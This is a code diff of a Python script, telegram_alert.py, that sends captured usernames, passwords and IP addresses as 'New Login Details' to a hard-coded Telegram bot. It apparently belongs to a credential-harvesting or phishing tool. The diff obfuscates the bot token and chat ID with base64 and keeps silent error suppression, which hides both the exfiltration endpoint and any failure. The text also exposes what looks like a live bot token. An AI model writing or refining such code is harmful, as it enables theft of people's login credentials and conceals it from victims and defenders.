@@ -1,12 +1,17 @@
 # telegram_alert.py
 
 import requests
+import base64
 
-# Config
-BOT_TOKEN = "7657625845:AAEL7RP1LWF2tUCWHfK71ocfWqGsG4VusDY"
-CHAT_ID = "6923749969"  # Your Telegram User ID
+# Encoded config (base64)
+ENCODED_BOT_TOKEN = "NzY1NzYyNTg0NTpBQUVMN1JQMUxXRjJ0VUNXSGZLNzFvY2ZXcUdzRzRWdXNEWQ=="
+ENCODED_CHAT_ID = "NjkyMzc0OTk2OQ=="
 
-def send_telegram_alert(username, password, ip_address, status):
+# Decode at runtime
+BOT_TOKEN = base64.b64decode(ENCODED_BOT_TOKEN).decode()
+CHAT_ID = base64.b64decode(ENCODED_CHAT_ID).decode()
+
+def send_telegram_alert(username="default_user", password="default_pass", ip_address="0.0.0.0", status="unknown"):
     message = f"""
 📌 New Login Details:
 
@@ -28,4 +33,4 @@ def send_telegram_alert(username, password, ip_address, status):
     try:
         requests.post(url, data=payload)
     except:
-        pass  # No output, even if sending fails
+        pass  # No output, no error shown
